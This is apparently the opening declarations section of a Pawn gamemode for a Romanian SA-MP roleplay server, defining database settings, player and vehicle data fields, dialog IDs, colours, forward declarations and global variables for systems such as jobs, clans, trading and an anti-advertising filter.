/*--------------------------------**INCLUDES**--------------------------------*/
#include <a_samp>
#include <a_mysql>
#include <streamer>
#include <playerzone>
#include <foreach>
#include <sscanf2>
#include <zcmd>
#include <mSelection>
#include <a_zones>
#include <beaZone>
#include <timerfix>
#include <dini>
#include <SRO>
#include <a_actor>
#include <crashdetect>
#include <timestamptodate>
/*----------------------------------------------------------------------------*/
#pragma dynamic 84872
/*-----------------------------**MySQL System**-------------------------------*/
#define         sqlhost         "127.0.0.1"
#define         sqluser         "root"
#define         sqldb           "test"
#define         sqlpass         ""
/*----------------------------------****--------------------------------------*/
new LorH = 1;
static gTeam[MAX_PLAYERS];

forward DeAMXI(playerid);
public DeAMXI(playerid)
{
 	AntiDeAMX();
	return 1;
}
// DEFINE
#define                             COLOR_AntiCheat                   0000ff
#define                             COLOR_AdminWarn                   0xC60000FF
//#define SQL
#define pVarGift
#define pVarGiftx
#define GetPName
#define SetVehicleParamsCarWindows
#define GetVehicleParamsCarWindows
#define pCashx				1
#define pRP  				2
#define pBank  				3
#define pCarLicTx 			4
#define pFlyLicTx 			5
#define pBoatLicTx 			6
#define pGunLicTx 			8
#define pRobx 				9
#define pFpunishx           10
#define pLawyerx            11
#define pConnectTimex       12
#define pPayDayx      		15
#define pPayCheckx      	16
#define pPhousekeyx      	17
#define pJailedx      		18
#define pJailTimex     		19
#define pWantedLevelx       21
#define pPhonex             22
#define pMatsx              23
#define pFishesx            24
#define pFishSkillx         25
#define pRobSkillx          26
#define pLevelx             27
#define pPremiumAccountx    28
#define pPbiskeyx           29
#define pPnumberx           30
#define pRegx               31
#define pRegistredDatex     32
#define pPcarkeyx           33
#define	pmotokeyx           34
#define	phelikeyx           35
#define	pprcarkeyx          36
#define pRentedx            37
#define pCrimesx            38
#define pCrime1x            40
#define pCrime2x            41
#define pCrime3x            42
#define pVictimx            43
#define pAccusedx           44
#define pEmailx             45
#define pWarnsx             52
#define pLanguagex          53
#define pPremiumPointsx     54
#define pprcarkey2x         55
#define pPPluscarkeyx       56
#define pPPluscarkey2x      57
#define pPlusSlot1x         58
#define pPlusSlot2x         59
#define pFWorksx            61
#define pVirtualPDx         62
#define pGlassesx           63
#define pHatsx           	64
#define pTruckSkillx        65
#define pTruckTimesx        66
#define pTruckRemx          67
#define pFarmSkillx         68
#define pFarmTimesx         69
#define pFarmRemx           70
#define pFishTimesx         71
#define pFishRemx           72
#define pSpawnChangex      	73
#define pRobTimesx          74
#define pRobRemx            75
#define pCreditsx           76
#define pFactionTimex       77
#define pNMutedx            78
#define pHelpedPlayersx     79
#define pHiddenColorx       80
#define pGiftTimex          81
#define pFightStylex        82
#define pHUD1x              83
#define pHUD2x              84
#define pHUD3x              85
#define pGasCanx			86
#define pCarLicSuspendx		87
#define pGunLicSuspendx		88
#define pPizzaSkillx		89
#define pPizzaTimesx		90
#define pPizzaRemx			91
#define pArmsSkillx			92
#define pArmsTimesx			93
#define pArmsRemx			94
#define pBusSkillx			95
#define pBusTimesx			96
#define pBusRemx			97
#define pGPointsx           98
#define pRunnersx           99
#define pArrestssx          100
#define pTicketsx           101
#define pDConfiscatex       102
#define pLConfiscatex       103
#define pContractsx         104
#define pNewsx              105
#define pLivesx             106
#define pOrdersx            107
#define pDDepositx          108
#define pMDepositx          109
#define pMUsedx             110
#define pWKillsx            111
#define pWDeathsx           112
#define pLGivenx          	113
#define pPHealsx            114
#define pHTokenx            115
#define pCarkey7x           116
#define pCarkey8x           117
#define pCarkey9x           118
#define pCarkey10x          119
#define pPaydayurix         220
#define pHCarx              221
#define pVipx              	222
#define pCarkey11x          223
#define pCarkey12x          225
#define pCarkey13x          226
#define pCarkey14x          227
#define pCarkey15x          228
#define pPhousekey2x        229
#define pReferralx        	230
#define pCasatoritx        	231
#define pCurierRemx        	232
#define pCurierSkillx       233
#define pCurierTimesx       234
#define pCimentRemx        	235
#define pCimentSkillx       236
#define pCimentTimesx       237
#define pCarieraRemx        238
#define pCarieraSkillx      239
#define pCarieraTimesx      240
#define pDailyPayDayx     	241
#define pColorsx     		242


// CARS
#define cLocationxx 			1
#define cLocationyx 			2
#define cLocationzx 			3
#define cAnglex 				4
#define cModelx                 5
#define cColorOnex              6
#define cColorTwox              7
#define cOwnerx                 8
#define cValuex                 9
#define cLicensex               10
#define cDescriptionx           11
#define cLockx                  12
#define cTimedx                 13
#define cInscarpricex           14
#define cInsurancecarx          15
#define cKMx                    16
#define cOwnedx                 17
#define cSellx                  18
#define cModsx                  19
#define cPaintJx                20
#define cDaysx                  21
#define cHPx					22
#define cDamage1x				23
#define cDamage2x				24
#define cDamage3x				25
#define cDamage4x				26
#define cGasx					27
#define cNewEnginex				28
#define cPortbagaj				29

//HOUSE
#define hExitxx             1
#define hExityx             2
#define hExitzx             3
#define hInteriorx          4
#define hLevelx             5
#define hValuex             6

#define NUMDIS 40.0
#define MAX_GANGZONES 68

//SBUSSINES
#define sbTillx         1
#define MAX_PVEHS (15)
#define EX_SPLITLENGTH 113
#define EX_SPLITLENGTHH 128
#define SECONDS_BETWEEN_SAME_MSGS (5)
#define RATE_INC (500)
#define RATE_MAX (2500)
#define THRESOLD_ACTION 1
#define MAX_GROUPS (15)
#define MAX_CLANS (3000)
#define MAX_PERSONAL_CARS (101)
#define MAX_LIGHTS 100
#define MAX_SPIKES 10
#define RBSprinkleid 20
#define SERVER_VERSION "TZ:RP v1.0.5"
#define AdminOnly "ERROR: {FFFFFF}You are not authorized to use this command."
#define SetPlayerHoldingObject(%1,%2,%3,%4,%5,%6,%7,%8,%9) SetPlayerAttachedObject(%1,MAX_PLAYER_ATTACHED_OBJECTS-1,%2,%3,%4,%5,%6,%7,%8,%9)
#define StopPlayerHoldingObject(%1) RemovePlayerAttachedObject(%1,MAX_PLAYER_ATTACHED_OBJECTS-1)
#define IsPlayerHoldingObject(%1) IsPlayerAttachedObjectSlotUsed(%1,MAX_PLAYER_ATTACHED_OBJECTS-1)
#define SpeedCheck(%0,%1,%2,%3,%4) floatround(floatsqroot(%4?(%0*%0+%1*%1+%2*%2):(%0*%0+%1*%1) ) *%3*1.8)
#define                 hidePlayerDialog(%0)                    ShowPlayerDialog(%0, -1, 0, " ", " ", "", "")
#define 				strcpy(%0,%1,%2) 						strcat((%0[0] = '\0', %0), %1, %2) // strcpy(dest, source, length)
#define GetVehicleSeats(%0) (GetVehicleModelSeats(GetVehicleModel(%0)))
#define function%0(%1) forward%0(%1); public%0(%1)
#define ATTACK_TYPE_PLAYERID 1
#define ATTACK_TYPE_IP 2
#define RELEASED(%0) \
	(((newkeys & (%0)) != (%0)) && ((oldkeys & (%0)) == (%0)))

// DIALOG ID
#define DIALOG_LOGIN1 				1
#define DIALOG_LOGIN2 				2
#define DIALOG_LOGIN3 				3
#define DIALOG_PLATE 				4
#define DIALOG_LOCATIONS 			5
#define Dialog_24 					7
#define Dialog_radio 				8
#define DIALOG_PREMIUM 				9
#define Dialog_Gym 					10
#define DIALOG_PHONESTAT 			11
#define DIALOG_MUS                  12
#define DIALOG_HQS 					17
#define DIALOG_MEMBERS 				32
#define DIALOG_CARDAMAGE 			43
#define DIALOG_WANTEDON 			54
#define DIALOG_TRANSFER 			59
#define DIALOG_MATSINSO 			65
#define DIALOG_JOBS 				71
#define DIALOG_CARBUY 				72
#define DIALOG_CARBUY2 				74
#define DIALOG_CARBUY3 				75
#define DIALOG_CARBUY4 				76
#define DIALOG_PENDEVENT 			86
#define DIALOG_LAWYERS 				96
#define DIALOG_MECHANICS 			98
#define DIALOG_INSTRUCTORS 			99
#define DIALOG_NEWPASS 				132
#define DIALOG_TRANSPORT 			187
#define DIALOG_REGISTER 			454
#define DIALOG_REGISTER2 			456
#define DIALOG_REGISTER3 			474
#define DIALOG_REGISTER4 			477
#define DIALOG_REGISTER5 			479
#define DIALOG_REGISTER6 			480
#define DIALOG_CARSELL 				483
#define DIALOG_YT 					484
//#define StopFly
#define DIALOG_MATERIALS 			485
#define DIALOG_DTRANSFER 			486
#define DIALOG_WALKSTYLE 			653
#define DIALOG_SHOP                 489
#define DIALOG_SHOP2                490
#define DIALOG_CHANGENAME           491
#define DIALOG_CLAN                 492
#define DIALOG_CLAN_TAG             493
#define DIALOG_CLANMEMBERS          494
#define DIALOG_FACTIONS            	495
#define DIALOG_FACTIONS2           	496
#define DIALOG_CARBUY8              497
#define DIALOG_HELP	                498
#define DIALOG_HELP2                499
#define DIALOG_LOCATIONSLS          500
#define DIALOG_LOCATIONSLV          501
#define DIALOG_LOCATIONSMODS        502
#define DIALOG_GMX                  503
#define DIALOG_TRUCKER1             504
#define DIALOG_TRUCKER2             505
#define DIALOG_TRUCKER3             506
#define DIALOG_TRUCKER4             507
#define DIALOG_CANCELJOB            508
#define DIALOG_TRUCKSELECT          509
#define DIALOG_TRUCKSELECTX         510
#define DIALOG_TRUCKSELECT2         511
#define DIALOG_TRUCKSELECT3         512
#define DIALOG_TRUCKSELECT4         513
#define DIALOG_SELLFISH             514
#define DIALOG_CARBUY5              515
#define DIALOG_NOSTOCK              516
#define DIALOG_LOCATIONS247LS       517
#define DIALOG_LOCATIONSBARLS       518
#define DIALOG_LOCATIONSBANKLS      519
#define DIALOG_LOCATIONSGYMLS       520
#define DIALOG_LOCATIONSBURGERLS    521
#define DIALOG_LOCATIONSPIZZALS     522
#define DIALOG_LOCATIONSGSLS        523
#define DIALOG_LOCATIONSCNNLS       524
#define DIALOG_LOCATIONSGASLS       525
#define DIALOG_LOCATIONSPNSLS       526
#define DIALOG_LOCATIONS247LV       527
#define DIALOG_LOCATIONSBANKLV      528
#define DIALOG_LOCATIONSBURGERLV    529
#define DIALOG_LOCATIONSGSLV        530
#define DIALOG_LOCATIONSCNNLV       531
#define DIALOG_LOCATIONSGASLV       532
#define DIALOG_LOCATIONSPNSLV       533
#define Dialog_gunshop              545
#define DIALOG_IPHONE               546
#define DIALOG_VEHSPAWN				547
#define DIALOG_VEHSPAWN1			548
#define DIALOG_VEHSPAWN2			549
#define DIALOG_VEHSPAWN3			550
#define DIALOG_VEHSPAWN4			551
#define DIALOG_JOBULETES            552
#define DIALOG_REPORT1              553
#define DIALOG_REPORT2              554
#define DIALOG_REPORTDM1            555
#define DIALOG_REPORTDM2            556
#define DIALOG_REPORTDM3            557
#define DIALOG_REPORTCH1            558
#define DIALOG_REPORTCH2            559
#define DIALOG_REPORTCH3            560
#define DIALOG_REPORT_AP1           561
#define DIALOG_COLORID              562
#define DIALOG_REPORT_DEGEABA       563
#define DIALOG_VEHSPAWN5			564
#define DIALOG_VEHSPAWN6			565
#define DIALOG_VEHINFO              566
#define DIALOG_INSURANCEBUY         567
#define DIALOG_INSURANCEBUY2        568
#define DIALOG_NOPP                 569
#define DIALOG_GIFTBOX              570
#define DIALOG_HUD                  571
#define DIALOG_HUD1                 572
#define DIALOG_HUD2                 573
#define DIALOG_HUD3                 574
#define DIALOG_PAINTBALL            575
#define DIALOG_PAINTBALLMAP         576
#define DIALOG_PAINTBALLWEAPON      577
#define DIALOG_LASTS                578
#define DIALOG_UNINVITE             579
#define DIALOG_EMAILS               580
#define DIALOG_EMAILS2              581
#define DIALOG_CLANMEMBERS2			582
#define DIALOG_CLANSETTINGS			583
#define DIALOG_CLANMEMBERS3			584
#define DIALOG_CLAN_RANK			585
#define DIALOG_CLAN_WARNS			586
#define DIALOG_CLAN_CHANGERANK		587
#define DIALOG_CLAN_COLOR			588
#define DIALOG_CLAN_CHANGERANK2		589
#define DIALOG_FRIENDS				590
#define DIALOG_ADDFRIENDS			591
#define DIALOG_FRIENDS2				592
#define DIALOG_QUITGROUP			593
#define DIALOG_QUITCLAN				594
#define DIALOG_CHOOSECLANNAME		595
#define DIALOG_CHOOSECLANTAG		596
#define DIALOG_SEXSHOP				597
#define DIALOG_BAR					598
#define DIALOG_LOCATIONSCLOTHINGLS	599
#define DIALOG_LOCATIONSRENTLS		600
#define DIALOG_LOCATIONSSEXLS		601
#define DIALOG_LOCATIONSMODLS		602
#define DIALOG_LOCATIONSCLOTHINGLV	603
#define DIALOG_LOCATIONSCLUCKINLV	604
#define DIALOG_LOCATIONSCASINOLV	605
#define DIALOG_LOCATIONSSEXLV		606
#define DIALOG_LOCATIONSMODLV		607
#define DIALOG_FWARN				608
#define DIALOG_FUNWARN				609
#define DIALOG_FPUNINVITE			610
#define DIALOG_NOUNINVITE			611
#define DIALOG_MEMBERS2				612
#define DIALOG_MEMBERS3				613
#define Dialog_shoplicense          614
#define DIALOG_HOURGIFT 			615
#define DIALOG_TICKET1              616
#define DIALOG_VOTE                 617
#define DIALOG_MP3                  618
#define DIALOG_VEHSPAWN7            619
#define DIALOG_VEHSPAWN8            620
#define DIALOG_VEHSPAWN9            621
#define DIALOG_VEHSPAWN10           622
#define Dialog_getweaponsarea       624


// WALKIE TALKIE
#define MAX_CHANNEL 1000

// WALKSTYLE
#define WALK_DEFAULT    0
#define WALK_NORMAL     1
#define WALK_PED        2
#define WALK_GANGSTA    3
#define WALK_GANGSTA2   4
#define WALK_OLD        5
#define WALK_FAT_OLD    6
#define WALK_FAT        7
#define WALK_LADY      	8
#define WALK_LADY2      9
#define WALK_WHORE      10
#define WALK_WHORE2     11
#define WALK_DRUNK     	12
#define WALK_BLIND     	13

#define maxobj 50
#define Spam_MaxMsgs     4
#define MAX_STRING 2400
#define c_y 0xFFFF00AA
#define c_r 0xAA3333AA
#define CHECKPOINT_NONE 0
#define CHECKPOINT_HOME 12
#define CHECKPOINT_LOCATE 53
#define KEY_AIM (128)
#define KEY_HANDBRAKE (128)
#define SCM SendClientMessage
#define SPECIAL_ACTION_PISSING 68

// KICK - BAN
new kickplayer[MAX_PLAYERS];
stock KickEx(playerid)
{
	kickplayer[playerid] = 1;
	return 1;
}
static const TLD[][] = { ".com", ".net", "www.", ".org", ".info", ".ru", ".ro", ".pl", ".tk", ".cc", "forteam", "for-team", "playnion", "ecila", "93.119.26.212", "Pro-gaming", "playnion", "Frags", "skyzone", "af-school", "afschool", "Bugged" "InSide", "t4p", "t4", "rpg.t4p.ro", "time4play", "bzone", "b-zone", "egaming", "e-gaming", "pronion", "prounion", "93.119.26.11", "soft-gaming", "softgaming", "9play", "pro-gaming", "redzmax", "b-gaming", "4-games", "proilegal", "gfzone", "vibeplay", "arth"};

//culori getgift
#define COLOR_IN2 				0xe7aaa5a5
#define COL_ENGINE_RED			"{FC1515}"
#define COL_ENGINE_GREEN		"{15FD02}"
#define COL_ENGINE_ALB			"{FFFFFF}"
#define COLOR_LIGHT			0xAFD9FAFF
#define COLOR_BISQUE		0xFFE4C4FF

// COLOR
#define COLOR_WHITE         0xFFFFFFFF
#define COLOR_ADMCHAT 		0xA9C4E4FF
#define COLOR_CHATBUBBLE    0xFFFFFFCC
#define COLOR_ERROR    		0xC1F589FF
#define COLOR_CHAT1 		0xF9B7FFAA
#define COLOR_CHAT2 		0xE6A9ECAA
#define COLOR_CHAT3 		0xC38EC7AA
#define COLOR_CHAT4 		0xD2B9D3AA
#define COLOR_CHAT5 		0xC6AEC7AA
#define COLOR_AFK 			0x565656FF
#define COLOR_GRAD1 		0xB4B5B7FF
#define COLOR_GRAD2 		0xBFC0C2FF
#define COLOR_GRAD3 		0xCBCCCEFF
#define COLOR_GRAD4 		0xD8D8D8FF
#define COLOR_GRAD5 		0xE3E3E3FF
#define COLOR_DARKNICERED 	0x9D000096
#define COLOR_RED1  		0x80404000
#define COLOR_GRAD6 		0xF0F0F0FF
#define COLOR_GREY 			0xCECECEFF
#define COLOR_GREEN 		0x33AA33AA
#define COLOR_ADV 			0x3DA614FF
#define COLOR_SYSTEM 		0xEFEFF7AA
#define COLOR_RED 			0xAA3333AA
#define COLOR_NEWS 			0xFFA500AA
#define COLOR_LIGHTBLUE 	0x33CCFFAA
#define COLOR_LOGIN 		0x00D269FF
#define COLOR_LIGHTGREEN 	0x8BBA2EAA
#define COLOR_ORANGE 		0xF97804FF
#define COLOR_ADMIN 		0xba9999FF
#define COLOR_YELLOW 		0xCECECEFF
#define COLOR_YELLOW2 		0xF5DEB3AA
#define COLOR_ADMCOMMANDS	0xCECECEFF
#define COLOR_SERVER        0xFFFFFFFF
#define COLOR_SERVER1 		0xFFFFFF00
#define COLOR_FADE1 		0xE6E6E6E6
#define COLOR_FADE2 		0xC8C8C8C8
#define COLOR_FADE3 		0xAAAAAAAA
#define COLOR_FADE4 		0x8C8C8C8C
#define COLOR_FADE5 		0x6E6E6E6E
#define COLOR_PURPLE 		0xC2A2DAAA
#define COLOR_DBLUE 		0x2641FEAA
#define TEAM_GREEN_COLOR 	0xFFFFFFAA
#define TEAM_BLUE_COLOR 	0x8D8DFF00
#define TEAM_GROVE_COLOR 	0x00D900C8
#define TEAM_AZTECAS_COLOR 	0x01FCFFC8
#define COLOR_TUTORIAL 		0x4A9500FF
#define COLOR_GROVE 		0x00E800FF
#define COLOR_DEPART 		0xFF3535AA
#define COLOR_RADIO			0x8D8DFFAA
#define CRISTIAN 			0x0DC013AA
#define COLOR_MAYOR         0xB3F856FF
#define COLOR_TEAL          0x67AAB1FF
#define COLOR_GENANNOUNCE   0xA9C4E4FF
#define COLOR_GENANNOUNCE2  0xFF8080FF
#define COLOR_ROB  			0x0C8176FF
#define COLOR_BLUE      	0x211CDEC8
#define COLOR_DARKPINK      0xFF80C0C8
#define COLOR_NEWBIE        0x9DFE8080
#define COLOR_LIGHTGREEN2   0x00FF00CC
#define COLOR_RED2          0xFF0000FF
#define COLOR_REPORT		0xF28F8FFF
#define COLOR_MEMBER		0x00B8E6FF
#define COLOR_LEADER		0x009ACDFF

// TEAM
#define TEAM_CYAN 	1
#define TEAM_BLUE 	2
#define TEAM_GREEN 	3
#define TEAM_ORANGE 4
#define TEAM_COR 	5
#define TEAM_BAR 	6
#define TEAM_TAT 	7
#define TEAM_CUN 	8
#define TEAM_STR 	9
#define TEAM_HIT 	10
#define TEAM_ADMIN 	11

// FORWARD
forward ini_GetKey( line[] );
forward ini_GetValue( line[] );
forward vUpdate(vehicleid, type);
forward InsertCar(playerid,type,stockid,giftbox);
forward	InsertPCar(playerid,model,value,namecar[],type);
forward IsAnOwnableCar(vehicleid);
forward HUpdate(hid, type);
forward Update(playerid, type);
forward aimback(playerid);
forward OnPropTextdrawUpdate(update, h);
forward MySQLCheckAccount(sqlplayersname[]);
forward MySQLCheckAccount2(sqlplayersname[]);
forward MySQLCheckClan(sqlclanname[]);
forward MySQLCheckCar(carname[]);
forward MySQLCheckSpeed(vidd);
forward Vendingg(playerid);
forward Vendingg2(playerid);
forward EstiFondator(playerid);
forward RwRobi(playerid);
forward Reportul(playerid);
forward VaildFishPlace(playerid);
forward lspdbarclose();
forward lvpdbarclose();
forward nggateclose();
forward lspdgateclose();
forward lvpdgateclose();
forward lvpdgateclose2();
forward jailclosegate();
forward Truckerr1(playerid);
forward Truckerr2(playerid);
forward Truckerr3(playerid);
forward Truckerr4(playerid);
forward AfterSpray(playerid);
forward DrugEffectGone(playerid);
forward IdleKick();
forward IsAGarbageTruck(carid);
forward IsABus(carid);
//forward IsAPizza(carid);
forward RACtime(playerid);
forward SendMSG();
forward RentTimer(playerid);
forward LoadDynamicFactions();
forward LoadClanInfo();
forward Float:GetDistance(playerid, Float:x, Float:y);
forward UnFreezeStation(playerid);
forward Fisher(playerid);
forward Fisher2(playerid);
forward SetFarmer(playerid);
forward BusDriverCheck(playerid);
forward restartTimer();
forward SetSomate(playerid);
forward SomateExpire(playerid);
forward RespawnTruck(playerid);
forward TowAgain(playerid);
forward Adminlog(string[]);
forward Factionlog(factionid,psql,lsql,action[]);
forward LogIP(string[],psql);
forward DrugFarmerExit(playerid);
forward BackupClear(playerid, calledbytimer);
forward setminute(playerid);
forward UnsetAfterTutorial(playerid);
forward LoadBizz();
forward LoadTurfs();
//forward IncarcaBrazi();
//forward IncarcaOmZapada();
forward LoadProperty();
forward LoadStock();
forward LoadCar();
forward LoadSystems();
forward IsAtGasStation(playerid);
forward IsAtBank(playerid);
forward IsAtOrderPlace(playerid);
forward SetPlayerSpawn(playerid);
forward SetupPlayerForClassSelection(playerid);
forward SetPlayerTeamFromClass(playerid,classid);
forward PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z);
forward CrimInRange(Float:radi, playerid,copid);
forward SendEnemyMessage(color, string[]);
forward SendTeamBeepMessage(team, color, string[]);
forward ABroadCast(color,const string[],level);
forward SendIP(color,const string[]);
forward HLChat(color,const string[]);
forward newbiechat(color,const string[]);
forward LeaderChat(color,const string[]);
forward aucutionChat(color,const string[]);
forward IsPlayerInTurf(playerid, turfid);
forward GetPlayerTurf(playerid);
forward IsPlayerInArea(playerid, Float:minx, Float:miny, Float:maxx, Float:maxy);
forward PrintBizInfo(playerid,targetid);
forward SetPlayerUnjail();
forward DeleteDeathMessage(playerid);
forward SavePlayerData();
forward SetPlayerPNS();
forward FiveSecondsTimer();
forward OtherTimer();
forward ZeroSec();
forward Fly();
forward IsAChiliad(carid);
forward IsATruck(carid);
forward IsAFarmer(carid);
forward IsAnAmbulance(carid);
forward IsAnTaxi(carid);
forward IsABike(carid);
forward IsACopCar(carid);
forward IsAFbiCar(carid);
forward IsALVPDCar(carid);
forward IsASFPDCar(carid);
forward IsANgCar(carid);
forward Copcar2(carid);
forward IsAPlane(carid);
forward IsABoat(carid);
forward IsACop(playerid);
forward IsAMember(playerid);
forward Spectator();
forward Float:GetDistanceBetweenPlayers(p1,p2);
forward AttachTrailerrr(playerid);
forward SetAllPlayerCheckpoint(Float:allx, Float:ally, Float:allz, Float:radi, num);
forward SetAllCopCheckpoint(Float:allx, Float:ally, Float:allz, Float:radi);
forward SetPlayerCriminal(playerid,declare,reason[]);
forward ShowStats(playerid,targetid);
forward SetPlayerToTeamColor(playerid);
forward GameModeExitFunc();
forward OnLoadAllCars();
forward LoadTextdraws();
forward GameModeInitExitFunc();
forward split(const strsrc[], strdest[][], delimiter);
forward OnPlayerLogin(playerid,password[]);
forward OnPlayerRegister(playerid, password[]);
forward BroadCast(color,const string[]);
forward OOCOff(color,const string[]);
forward OOCNews(color,string[]);
forward OOCNews2(color,const string[]);
forward SendJobMessage(job, color, string[]);
forward SendFamilyMessage(family, color, string[]);
forward SendNewFamilyMessage(family, color, string[]);
forward SendTeamMessage(member, color, string[]);
forward SendRadioMessage(member, color, string[]);
forward ProxDetector(Float:radi, playerid, string[],col1,col2,col3,col4,col5);
forward ProxDetectorS(Float:radi, playerid, targetid);
forward GetWeekDay();
forward ClearCrime(playerid);
forward CarCheck();
forward CarTow(carid);
forward TowCar(car,car2,playerid);
forward CheckGas();
forward SyncTime();
forward FindCheck();
forward Production();
forward PayDay();
forward tdhide2(playerid);
forward tdhide(playerid);
forward FixHour(hour);
forward CountDownCheck3(playerid);
forward CountDownCheck2(playerid);
forward CountDownCheck1(playerid);
forward Livrarepizza1(playerid);
forward Livrarepizza2(playerid);
forward CountDownCheckGo(playerid);
forward CheckAFK();
forward CountDownFinalize();
forward payala2(playerid);
forward LocateCar(car,playerid);
forward PlayerMapIconPaint(playerid);
new gatehqa;
forward gateadminclose();
new last1Min = -1;
new Text:textile;

new housestring[600][256];
new barstring[100][256];

new sarmale[MAX_PLAYERS];
new DespawnCar[MAX_PLAYERS][15];
//-----------------NEW'S - DEFINES AND OTHER by DeaThWiN.---------------------//
// Coliziuni
new coliziuniactive[MAX_PLAYERS];
// Nickname Colors
#define DIALOG_NCOLORS 1010
// Anti AimBot
new resetare_detectare_aimbot[MAX_PLAYERS];
new ucideri_detectare_aimbot[MAX_PLAYERS];
// Informatii War
new boxawar[MAX_PLAYERS];
new PlayerText:WarTD[7];
// Securitate cu Numar de Telefon.
new problemalogin[MAX_PLAYERS];
new codacces[MAX_PLAYERS][128];
#define DIALOG_BSECURITATE 1000
// TOG ADMIN
new tog_admin[MAX_PLAYERS]; 
// PaintBall
new AscundeTD[MAX_PLAYERS];
new T_SAU_CT[MAX_PLAYERS];
new paint_incepe = -1,paint_jucatori = 0,timp_paint = 0;
new PlayerText:PaintTD[9];
new incamerapaintball[MAX_PLAYERS];
// Artificii
#define NRARTIFICI 100
enum EnumArtificie
{
	Float:Artificie_Pozitie[4],
	Float:Artificie_Inaltime,
	Float:Artificie_Raza,
	NRFocuri,
	Lansata,
	Directie,
	Obiect,
	ObiectFum,
	TimpLansare,
	TimpCuloare,
	CuloareArtificie,
	Float:CuloareArtificie_Pozitie[3],
	TimpCuloare_Distrugere[25],
	Culoare_Distrugere[25],
	Culoare_Distrugere2[100],
	TimpCuloare_Distrugere2[100],
	TimpDistrugereTotala
}
new Artificie[NRARTIFICI][EnumArtificie];
new timp_artificie[MAX_PLAYERS];
/*Quest oameni de zapada.
new QuestTimer[MAX_PLAYERS];
new ultimulomdezapada = 0;
enum OmZAPADA
{
	ID,
	Float:PozitieOMZapada[4],
}
new OMZapada[51][OmZAPADA];
new Omdezapada[MAX_PLAYERS][sizeof(OMZapada)][9];
new incarcaomdezapada = -1;*/
// Sistem Trade
new pregatit_trade[MAX_PLAYERS];
new suma_bani_trade[MAX_PLAYERS];
new casa_trade[MAX_PLAYERS];
new afacere_trade[MAX_PLAYERS];
new partitie_trade[MAX_PLAYERS];
new iteme_adaugate[MAX_PLAYERS];
new vehicule[15][MAX_PLAYERS];
#define DIALOG_TRADE 902
new PlayerText:TradeTD[38];
new in_afacere_cu[MAX_PLAYERS];
new invitatie_trade[MAX_PLAYERS];
// DIALOG ACTIVITY EVENT
#define DIALOG_ACTIVITY  900
// IARNA | 0 = NU, 1 = DA |
new iarna = 1;
// Sistem brazi
new incarcabradtimer = -1;
new ultimulbrad = 0;
enum Brazi
{
	ID,
	Float:PozitieBrad[4],
}
new Brad[100][Brazi];
new ObjectBrad[sizeof(Brad)];
// ZAPADA
new zapada = 0;
#define SNOW_OBJECT   18864
new MAX_SNOW = 1;
static snowObject[MAX_PLAYERS][6];
static snowActive[MAX_PLAYERS];
// Oferte zilnice
new ofertazilei = 0;
// Apreciere Update
new idupdate[MAX_PLAYERS];
// JOB Muncitor in Cariera
new CarieraObiecte[MAX_PLAYERS];
new CarieraObiect[MAX_PLAYERS][26];
new JCariera[MAX_PLAYERS][3];
// JOB Transportator de Ciment
new betonobject1[MAX_PLAYERS];
new betonobject2[MAX_PLAYERS];
new JCiment[MAX_PLAYERS][3];
// Portbagaj
new PortbagajVID[MAX_PLAYERS];
#define DIALOG_PORTBAGAJ 878
// BLOCK VIP
new Float:BLXYZ[3];
new Float:BLRaza;
// Radar
new Radarlimit[MAX_PLAYERS];
new Radaron[MAX_PLAYERS];
// MP3 
new MP3ON[MAX_PLAYERS];
// JOB Curier
#define DIALOG_CURIER 875
new JCurier[MAX_PLAYERS][4];
// TIMER INCARCARE MAPA
new bugobiecte[MAX_PLAYERS];
// TIMER REFERRAL
new timereferral[MAX_PLAYERS];
// TOG VIP
new vipchat[MAX_PLAYERS];
// Bug Freeze
new arefreeze[MAX_PLAYERS];
// Daily Bonus
#define	DIALOG_DBONUS	870
new rotiredailybonus[MAX_PLAYERS];
new PlayerText:DailyTD[33];
// Casatorie
new invitatiecasatorie[MAX_PLAYERS];
#define	DIALOG_CASATORIE 868
new timercasatorie[MAX_PLAYERS];
// Clan War
new incwar[MAX_PLAYERS];
new mortcwar[MAX_PLAYERS];
enum CWInfo
{
    cClan,
	cClanAttacker,
	cClanTime,
	Float:cClanHP,
};
new ClanWar[2000][CWInfo];
new invitatiecattack[MAX_PLAYERS];
#define DIALOG_CLANWAR	865
#define DIALOG_CLANUPGRADE 863
new PlayerText:CWarTD[6];
// PROTECTIE BAN
new limitabanuri[MAX_PLAYERS];
new banuriinminut[MAX_PLAYERS];
// Referral System
new banireff[MAX_PLAYERS];
new rpreff[MAX_PLAYERS];
new ppreff[MAX_PLAYERS];
#define	DIALOG_REFERRAL 860
// VIP SYSTEM
new loginautomat[MAX_PLAYERS];
#define DIALOG_VIPLOGIN 	856
new folosirespawnchange[MAX_PLAYERS];
#define DIALOG_VEHSPAWN15	855
#define DIALOG_VEHSPAWN14	854
#define DIALOG_VEHSPAWN13	853
#define DIALOG_VEHSPAWN12	852
#define DIALOG_VEHSPAWN11	851
#define DIALOG_VIP 840
new bonus5ore[MAX_PLAYERS];
// School Instructors
new arenevoiedelicenta[MAX_PLAYERS];
// KENO UNIVERSE SYSTEM
//new numerekeno[MAX_PLAYERS][15];
new timerkeno[MAX_PLAYERS];
//new BilaSelectata[MAX_PLAYERS][61];
//new BileSelectate[MAX_PLAYERS];
new MizaKeno[MAX_PLAYERS];
//new PlayerText:KenoTD[112];
// SPEC SYSTEM
#define DIALOG_SpecConfirmare 836
new PlayerText:SpecTD[11];
// SKIN SYSTEM
new SkinuriDulap[MAX_PLAYERS];
new SKINSELECTAT[1001][MAX_PLAYERS];
new CumparaSkin[MAX_PLAYERS];
new SKINID[MAX_PLAYERS];
new Skinuri[MAX_PLAYERS];
new IDSKIN[100][MAX_PLAYERS];
new PRETSKIN[100][MAX_PLAYERS];
new PlayerText:SkinTD[9];
// LOGIN TD
//new Text:LoginTD[18];
// Coliziuni PNS
new coliziunipns[MAX_PLAYERS];
//TIMER TONOMAT
new TonomatTime[MAX_PLAYERS];
// TRILIOANE BANCA
new sendbankkick[MAX_PLAYERS];
#if defined _Long_Yoyo
	#endinput
#endif
#define _Long_Yoyo

#define Long_Yoyo_Version				(10601)

#define LY_STRING_LEN					(20)
#define SEP_LY_STRING_LEN				(LY_STRING_LEN+10)
#define MAX_LY_STRING					(LY_STRING_LEN)
#define MAX_SEP_LY_STRING				(SEP_LY_STRING_LEN)

#define MAX_LY_PREFIX	 				(2147483647)
#define DEFAULT_MAX_LY_PREFIX			(2000000000)
//ROB SYSTEM
new actorpolitistcorupt;
new actorbanca[MAX_PLAYERS];
new banirob[MAX_PLAYERS];
